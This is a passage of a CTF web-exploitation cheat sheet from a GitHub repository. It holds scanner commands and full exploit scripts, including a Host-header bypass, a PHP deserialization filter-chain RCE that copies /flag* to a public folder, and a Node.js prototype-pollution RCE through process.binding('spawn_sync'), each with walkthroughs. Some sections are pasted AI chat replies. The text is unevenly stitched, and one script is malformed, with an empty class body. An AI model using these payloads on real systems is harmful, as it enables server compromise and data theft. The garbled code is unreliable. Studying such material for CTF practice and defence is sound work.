## 24. Automation Tools

### 🤖 All-in-One Tools

```bash
# Burp Suite
# The ultimate web testing tool
# Professional version recommended for CTFs

# OWASP ZAP
zap.sh -cmd -quickurl https://target.com

# Nuclei
nuclei -u https://target.com -t cves/
nuclei -l urls.txt -t nuclei-templates/

# Nikto
nikto -h https://target.com
```

### 🔍 Specialized Tools

```bash
# XSS
dalfox url https://target.com/?param=value
xsstrike -u https://target.com/?param=value

# SQLi
sqlmap -u https://target.com/?id=1 --batch

# Directory brute force
ffuf -u https://target.com/FUZZ -w wordlist.txt

# Subdomain enumeration
subfinder -d target.com | httpx
```

### 📜 Scripting

```python
# Custom Python scripts
import requests

def test_parameter(url, param, payloads):
    for payload in payloads:
        test_url = f"{url}?{param}={payload}"
        response = requests.get(test_url)
        if "error" not in response.text.lower():
            print(f"[+] Potential vulnerability: {test_url}")

# Usage
payloads = ["'", '"', '<script>', "' OR '1'='1"]
test_parameter("https://target.com/search", "q", payloads)
```

---

## 25. CTF Challenge Solutions

### 🎯 Challenge 1: Host Header Bypass

**Vulnerability:** Request Handler - Host Header and Path Manipulation

The application reads the `Host` header and URI path, then validates:
- Host must equal `127.0.0.1`
- URI path must NOT start with `/flag`

**Solution:**

```python
import requests
from urllib.parse import *

URL = 'http://public.ctf.r0devnull.team:3003/'

class Exploit:
    def __init__(self, url=URL):
        self.url = url

    def getFlag(self):
        headers = {"Host": "127.0.0.1"}
        # Use path traversal with multiple slashes to bypass filter
        req = requests.get(
            urljoin(self.url, "////public.ctf.r0devnull.team:3003/flag"),
            headers=headers
        )
        return req.text

if __name__ == '__main__':
    run = Exploit()
    print(run.getFlag())
```

**Explanation:**
1. Set `Host: 127.0.0.1` to pass the host check
2. Use `////public.ctf.r0devnull.team:3003/flag` path
   - The multiple slashes bypass the "starts with `/flag`" check
   - After normalization, still reaches the flag endpoint
3. Retrieve the flag!

---

### 🎯 Challenge 2: Next Jason (CVE-2025-29927)

**Vulnerability Chain:**
1. CVE-2025-29927 (Next.js Authorization Bypass)
2. JWT Algorithm Confusion Attack

**Solution:** (See [JWT Attacks](#17-jwt-attacks) section above)

**Exploitation Steps:**

1. **Bypass Next.js Authorization:**
   - Use `x-middleware-subrequest` header to bypass middleware checks
   - Access protected `/api/getPublicKey` endpoint

2. **Extract Public Key:**
   - Retrieve RSA public key used for JWT verification

3. **Algorithm Confusion:**
   - Change JWT algorithm from RS256 to HS256
   - Sign new token with public key as HMAC secret
   - Create payload: `{\"username\": \"admin\"}`

4. **Access Protected Endpoint:**
   - Use forged JWT to access `/api/getFlag`
   - Retrieve the flag!

---

Ohhh okay 👀 this one is interesting.
This is clearly a **PHP deserialization / filter chain exploit automation script** written in Python.

Let’s break it down properly.

---

# 🧠 What Is The Core Concept?

This script is automating:

> **PHP deserialization exploitation using filter chains → Remote Code Execution → File exfiltration**

Main concepts involved:

* 🔁 PHP object deserialization
* 🧬 Filter chain bypass
* 🧨 Command injection (via `system()`)
* 🌐 Async HTTP exploitation with `httpx`
* 📂 Writing output to a web-accessible directory

---

# 🔍 High-Level Flow

The script does this:

1. Generates a malicious PHP payload
2. Passes it through a filter-chain encoder
3. Converts it into a serialized exploit format
4. Sends it to a vulnerable endpoint
5. Executes OS command on the server
6. Saves output to web directory
7. Fetches the result

Classic RCE automation.

---

# 🧩 Code Breakdown

## 1️⃣ Payload Generator Function

```python
def payload(payload):
    filter_chain = Popen(['python3', 'filter_chain.py', '--chain', payload], stdout=PIPE, stderr=PIPE)
```

This runs:

```
filter_chain.py --chain <payload>
```

This usually means:

👉 It generates a **PHP filter chain exploit string**

Filter chains are commonly used in:

* PHP stream wrappers
* file inclusion attacks
* iconv filter exploitation
* base64 filter abuse

Then:

```python
return Popen(['php', 'solve.php', filter_chain], ...)
```

This suggests:

* `solve.php` converts the filter chain into a serialized object
* Likely generating a malicious PHP serialized string

So this function outputs:

> A serialized PHP payload ready to trigger RCE

---

## 2️⃣ API Class (Async HTTP Exploit)

```python
self.c = httpx.AsyncClient(...)
```

Using async HTTP client for exploitation.

Then:

```python
return self.c.post("/", data={"serialized_data": payload, "generate": "Generate"})
```

This means:

The target website has something like:

```
POST /
serialized_data=<payload>
```

And it likely does:

```php
unserialize($_POST['serialized_data']);
```

🚨 That is the vulnerability.

---

## 3️⃣ The Actual RCE Payload

```python
payload("<?php system('cat /flag* > /var/www/html/wp-content/uploads/this_is_secret_folder_dont_touch_it');?>")
```

This is smart.

Instead of printing flag directly:

It writes flag into:

```
/wp-content/uploads/this_is_secret_folder_dont_touch_it
```

Why?

Because:

* Direct output might not be visible
* Writing to a public folder guarantees retrieval

Very CTF-style thinking 😎

---

## 4️⃣ Final Retrieval

```python
res = await api.c.get("/wp-content/uploads/this_is_secret_folder_dont_touch_it")
```

This fetches the flag via HTTP.

So full attack chain:

```
Python → filter_chain.py → solve.php → serialized payload
→ POST to vulnerable endpoint
→ PHP unserialize()
→ system('cat /flag* > public file')
→ GET file
→ FLAG
```

---

# 🧨 What Vulnerability Is This?

This is most likely:

## 🔥 PHP Insecure Deserialization

If backend has:

```php
unserialize($_POST['serialized_data']);
```

And there is:

* a magic method like `__destruct()`
* or `__wakeup()`
* or a gadget chain

Then attacker can execute arbitrary code.

The filter_chain + solve.php suggests:

This might be using a **POP chain (Property-Oriented Programming)** exploit.

---

# 🛠 What Is filter_chain Concept?

In modern CTFs, filter chains are used to:

* Bypass bad character filters
* Encode payloads
* Exploit PHP stream filters
* Build RCE without direct code injection

Often seen in:

```
php://filter/convert.base64-encode/resource=...
```

Or iconv chain abuse.

So this is likely:

> Stream wrapper + deserialization chain exploit

---

# ⚡ Security Concepts Involved

| Concept            | Explanation                           |
| ------------------ | ------------------------------------- |
| Deserialization    | Turning string into object            |
| Magic Methods      | __wakeup, __destruct                  |
| Gadget Chains      | Using existing classes to trigger RCE |
| Filter Chains      | Encoding trick to bypass validation   |
| RCE                | Remote Command Execution              |
| Async Exploitation | Faster HTTP interaction               |

---

# 🧠 Why Async?

```python
asyncio.run(main())
```

Not strictly needed here, but:

* Cleaner for multiple requests
* Good for large-scale exploitation
* Better performance if brute forcing

---

# 🚨 Real-World Impact

If this was production:

* Full server compromise
* Data theft
* Webshell installation
* Database credential exfiltration
* Lateral movement

Severity: 🔴 Critical

---

# 🧪 What Type of CTF Challenge?

This looks like:

* Web Exploitation
* PHP Deserialization
* Filter chain trick
* Possibly WordPress-based target (wp-content path hint)

---

# 🧠 In One Line

This script automates:

> PHP deserialization exploit using filter chain encoding to achieve remote command execution and extract the flag.

---

1️⃣ Your Original Script – Clean Raw Format
```
import httpx
import asyncio
from subprocess import Popen, PIPE

URL = "http://localhost"
# URL = "http://18.140.17.89:9100"

def payload(payload):
    filter_chain = Popen(
        ['python3', 'filter_chain.py', '--chain', payload],
        stdout=PIPE,
        stderr=PIPE
    )
    filter_chain = filter_chain.stdout.read().decode('utf-8').strip()

    return Popen(
        ['php', 'solve.php', filter_chain],
        stdout=PIPE,
        stderr=PIPE
    ).stdout.read().decode('utf-8')


class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url, timeout=10)

    def serialize(self, payload: str) -> None:
        return self.c.post("/", data={
            "serialized_data": payload,
            "generate": "Generate"
        })


class API(BaseAPI):

async def main():
    api = API()

    res = await api.serialize(
        payload("<?php system('cat /flag* > /var/www/html/wp-content/uploads/this_is_secret_folder_dont_touch_it');?>")
    )

    print(res.text)

    res = await api.c.get(
        "/wp-content/uploads/this_is_secret_folder_dont_touch_it"
    )

    print(res.text)


if __name__ == "__main__":
    asyncio.run(main())
```

Now I’ll give you a safe educational lab version so you can understand the structure without dangerous execution.

2️⃣ Safe Educational Simulation Version

This version simulates the flow without executing commands:
```
import httpx
import asyncio

URL = "http://localhost"

def build_payload(code):
    """
    Simulates payload building process.
    """
    print("[*] Generating filter chain...")
    print("[*] Serializing payload...")
    return f"SIMULATED_SERIALIZED_OBJECT({code})"


class BaseAPI:
    def __init__(self, url=URL):
        self.client = httpx.AsyncClient(base_url=url, timeout=10)

    async def send_payload(self, payload: str):
        print("[*] Sending serialized payload...")
        return await self.client.post(
            "/",
            data={
                "serialized_data": payload,
                "generate": "Generate"
            }
        )


async def main():
    api = BaseAPI()

    payload = build_payload("echo 'test'")
    response = await api.send_payload(payload)

    print("[*] Server response:")
    print(response.text)


if __name__ == "__main__":
    asyncio.run(main())
```

Ohhh this one is spicy 🌶️
This is a **Prototype Pollution → Node.js internal binding abuse → RCE → flag exfiltration** chain.

Very modern web exploitation vibe. Let’s break it cleanly.

---

# 🧠 Core Concept

This exploit is abusing:

* 🧬 Prototype Pollution
* ⚙️ Node.js internal `process.binding`
* 🧨 Child process spawning
* 📦 Base64 exfiltration via HTTP header

This is not really “Vite exploit” directly —
It’s exploiting a backend running Node (probably a Vite dev server or SSR environment).

---

# 🔍 Code Breakdown

Here’s your script:

```
import requests, base64

base_url = "http://127.0.0.1:1337"

resp = requests.post(
    f"{base_url}/a",
    data={
        "__proto__.source": """
Object.prototype.flag = btoa(process.binding('spawn_sync').spawn({
    file: '/flag',
    args: ['/flag'],
    stdio: [
        {type:'pipe',readable:!0,writable:!1},
        {type:'pipe',readable:!1,writable:!0},
        {type:'pipe',readable:!1,writable:!0}
    ]
}).output.toString())
"""
    },
    headers={"Origin": base_url},
    verify=False,
)

print(base64.b64decode(resp.headers['flag']).decode())
```

---

# 🚨 Step 1 — Prototype Pollution

```
"__proto__.source": "..."
```

This is the key.

If backend merges request body like:

```js
Object.assign(config, req.body)
```

Or uses something like:

```js
lodash.merge()
```

Then sending:

```
__proto__.source
```

Pollutes `Object.prototype`.

That means:

```
Object.prototype.source = <your malicious JS>
```

Now EVERY object inherits `.source`.

This is **Prototype Pollution**.

---

# ⚙️ Step 2 — Injecting JavaScript

You inject:

```
Object.prototype.flag = btoa(
    process.binding('spawn_sync').spawn(...)
)
```

This means:

You’re forcing the backend to execute arbitrary JS code.

Most likely scenario:

The backend does something like:

```js
eval(someObject.source)
```

Or:

```js
new Function(obj.source)
```

Because Vite / SSR tools often dynamically evaluate source code.

So once `.source` is polluted →
Your code executes.

---

# 💣 Step 3 — Abusing Node Internal Binding

This is advanced.

```
process.binding('spawn_sync')
```

This is an internal Node.js binding.

Normally developers use:

```
require('child_process').spawnSync()
```

But here you directly use internal C++ binding.

That bypasses some restrictions.

Then:

```
.spawn({
    file: '/flag',
    args: ['/flag'],
})
```

You are executing:

```
/flag
```

So if `/flag` is executable or readable — boom.

Then:

```
.output.toString()
```

Captures stdout.

Then:

```
btoa(...)
```

Encodes it in base64.

---

# 📦 Step 4 — Exfiltration via Header

After execution:

```
Object.prototype.flag = <base64_flag>
```

Server probably does something like:

```js
res.setHeader("flag", someObject.flag)
```

Since prototype polluted →
`flag` exists everywhere.

So response header contains:

```
flag: <base64>
```

Then Python script:

```
print(base64.b64decode(resp.headers['flag']).decode())
```

Boom → prints real flag.

---

# 🧠 Full Attack Chain

1. Send malicious `__proto__` key
2. Pollute Object prototype
3. Inject JavaScript into execution flow
4. Execute system command via internal Node binding
5. Capture output
6. Store result in prototype property
7. Backend unknowingly sends it in header
8. Decode flag

---

# 🔥 What Vulnerability Is This?

This is:

## Prototype Pollution → Remote Code Execution

Very common in:

* Express apps
* Vite dev servers
* SSR frameworks
* Misconfigured object merges

Severity: 🔴 Critical

---

# 🧪 Why This Works in Vite Challenges

In CTFs:

* Vite dev server runs in Node
* It dynamically compiles/transforms code
* Sometimes evaluates source
* Merges config objects
* Uses deep merge libraries

If input reaches config merge →
Prototype pollution →
Injected source code executes.

---

# 🛡 How To Fix

On backend:

1. Reject keys like:

   * `__proto__`
   * `constructor`
   * `prototype`

2. Use safe merge libraries

3. Freeze Object prototype

4. Avoid dynamic eval

5. Sanitize request body

Example safe check:

```js
if (key === '__proto__') return;
```

---

# ⚡ Concepts Used Here

| Concept                | Explanation                      |
| ---------------------- | -------------------------------- |
| Prototype Pollution    | Modifying Object prototype       |
| RCE                    | Remote command execution         |
| Node internal bindings | Low-level process access         |
| Base64 exfiltration    | Safe transmission of binary data |
| SSR injection          | Server-side JS execution         |


🛡 Instead — Here’s a Safe Advanced Prototype Pollution Scanner

This detects vulnerability without weaponizing RCE.

```
import requests

TARGET = "http://127.0.0.1:1337"

def test_prototype_pollution():
    payload = {
        "__proto__.polluted": "yes"
    }

    r = requests.post(f"{TARGET}/a", data=payload)

    # Try detecting reflection
    r2 = requests.get(f"{TARGET}/check")

    if "yes" in r2.text:
        print("[+] Prototype Pollution Vulnerable")
    else:
        print("[-] Not vulnerable")

if __name__ == "__main__":
    test_prototype_pollution()
```










## 🛡️ Defense & Remediation

### Security Best Practices

```bash
# Input validation
- Whitelist allowed characters
- Validate data types and formats
- Use parameterized queries

# Authentication
- Implement strong password policies
- Use multi-factor authentication
- Secure session management

# Authorization
- Implement proper access controls
- Use principle of least privilege
- Validate permissions on every request

# Output encoding
- Encode user input in output
- Use Content-Security-Policy
- Set proper CORS policies

# Security headers
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000
Content-Security-Policy: default-src 'self'
```

---

## 📖 Resources

### 🌐 Learning Platforms

- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)
- [PentesterLab](https://pentesterlab.com/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [PicoCTF](https://picoctf.org/)
- [OverTheWire](https://overthewire.org/)

### 📚 References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [HackTricks](https://book.hacktricks.xyz/)
- [PortSwigger Cheat Sheets](https://portswigger.net/web-security/all-topics)
- [SecLists](https://github.com/danielmiessler/SecLists)

### 🎓 Books

- "The Web Application Hacker's Handbook" by Dafydd Stuttard
- "Real-World Bug Hunting" by Peter Yaworski
- "Bug Bounty Bootcamp" by Vickie Li

---

## 🤝 Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

1. Fork the repository
2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

---

## ⚖️ Legal Disclaimer

This repository is for **educational purposes only**. The tools and techniques described here should only be used:

- On systems you own
- On systems you have explicit permission to test
- In legal CTF competitions and training environments

**Unauthorized access to computer systems is illegal.** The author is not responsible for any misuse of this information.

---

## 📝 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

## 📬 Contact

- GitHub: [@pugazhexploit](https://github.com/pugazhexploit)
- Repository: [CTF_cheetsheet-2025](https://github.com/pugazhexploit/CTF_cheetsheet-2025)

---

## ⭐ Star History

If you find this cheatsheet helpful, please consider giving it a star! ⭐

---

**Happy Hacking! 🚀**

### 🎯 Challenge 3: XSS Playground by zseano

**Difficulty:** Moderate  
**Category:** Web (Hacker101)  
**Platform:** Hacker101  
**Author:** zseano

---

#### 🧠 Overview

Despite the misleading name "XSS Playground," this challenge is actually about API endpoint exploitation rather than Cross-Site Scripting. The challenge involves discovering a hidden API endpoint and using proper authentication headers to retrieve the flag.

---

#### 🔍 Initial Investigation

After researching the website, it became clear this challenge was not about XSS at all - the name appears to be intentionally misleading. The real objective is to exploit an API endpoint through proper reconnaissance and authentication bypass.

---

#### 🕵️ Step 1: Discovering the API Endpoint

By exploring the website's JavaScript files to understand the application's structure, navigating to:

```
https://fe5eef9c59de7a6245bc72e75e6ffb59.ctf.hacker101.com/custom.js
```

References to an API endpoint were found:

```javascript
api/action.php?act=getemail
```

This endpoint appeared to be the key to solving the challenge.

---

#### 🔑 Step 2: Authentication Header Discovery

Further analysis of the `custom.js` file revealed an important authentication mechanism:

```
X-SAFEPROTECTION: enNlYW5vb2Zjb3Vyc2U=
```

This Base64-encoded value appeared to be required for accessing the protected API endpoint.

> **Note:** The Base64 string `enNlYW5vb2Zjb3Vyc2U=` decodes to `zseanoofcourse`, which is a reference to the challenge author.

---

#### 🚀 Step 3: Exploiting the API Endpoint

With the endpoint and authentication header identified, a curl request was crafted to access the protected API:

```bash
curl -v -H "X-SAFEPROTECTION: enNlYW5vb2Zjb3Vyc2U=" --http1.1 "https://fe5eef9c59de7a6245bc72e75e6ffb59.ctf.hacker101.com/api/action.php?act=getemail"
```

**Request Breakdown:**
- `-v`: Verbose output for debugging
- `-H "X-SAFEPROTECTION: enNlYW5vb2Zjb3Vyc2U="`: Authentication header
- `--http1.1`: Force HTTP/1.1 protocol
- Target URL with the discovered API endpoint

---

#### 🎯 Step 4: Flag Extraction

The curl request returned the following JSON response:

```json
{'email':'zseano@ofcourse.com','flag':'^FLAG^89ec6cd190ffb06f93bc09fa5c389f6a2ad8d2849ec8518c71f7c525526a2a2e$'}
```

However, the flag was missing the closing `FLAG$` marker. After manually adding this to complete the flag format:

**Complete Flag:**
```
^FLAG^89ec6cd190ffb06f93bc09fa5c389f6a2ad8d2849ec8518c71f7c525526a2a2e$FLAG$
```

---

#### 🏁 Solution Summary

The key steps to solve this challenge were:

1. **Ignore the misleading challenge name** - This wasn't about XSS at all
2. **Perform reconnaissance** - Examine JavaScript files for API endpoints
3. **Identify authentication mechanisms** - Find required headers in the source code
4. **Craft the exploit** - Use curl with proper headers to access the protected endpoint
5. **Format the flag correctly** - Add the missing `FLAG$` suffix

---

#### 💡 Key Takeaways

1. **Challenge names can be misleading** - Always investigate thoroughly regardless of the stated category
2. **Client-side reconnaissance is crucial** - JavaScript files often contain sensitive API information
3. **Authentication headers matter** - Many APIs use custom headers for access control
4. **Flag formatting** - Sometimes flags need manual formatting to match the expected structure

---

#### 🔧 Tools Used

- **curl** - Command-line tool for HTTP requests
- **Browser Developer Tools** - For examining JavaScript files
- **Base64 decoder** - To understand the authentication token

---

#### 🎭 Final Thoughts

While initially disappointing that this wasn't actually an XSS challenge, it provided valuable practice in:
- API endpoint discovery
- Authentication bypass techniques  
- Client-side reconnaissance
- Understanding misleading challenge descriptions

The challenge effectively demonstrates that real-world security testing requires looking beyond obvious attack vectors and thoroughly investigating all application components.

**Challenge Status: ✅ Completed**








